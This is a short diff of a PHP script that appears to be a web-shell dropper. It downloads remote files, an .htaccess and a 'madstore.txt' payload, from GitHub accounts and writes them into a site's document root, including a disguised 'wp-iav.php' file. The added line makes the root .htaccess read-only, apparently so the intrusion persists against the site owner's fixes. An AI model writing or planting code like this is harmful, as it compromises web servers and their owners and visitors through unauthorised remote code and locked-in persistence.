@@ -10,6 +10,7 @@ if(file_put_contents($local, $file));
 $filee = sexx('https://raw.githubusercontent.com/HecSec/New/main/.htaccess');
 $locall=$_SERVER['DOCUMENT_ROOT']."/cgi-et/.htaccess";
 if(file_put_contents($locall, $filee));  
+@chmod($_SERVER['DOCUMENT_ROOT'] . "/.htaccess", 0444);
 
 $sec31= sexx('https://raw.githubusercontent.com/XetSec/Xet/main/madstore.txt');
 $wpoptionss31 = $_SERVER['DOCUMENT_ROOT'] . "/cgi-et/wp-iav.php";
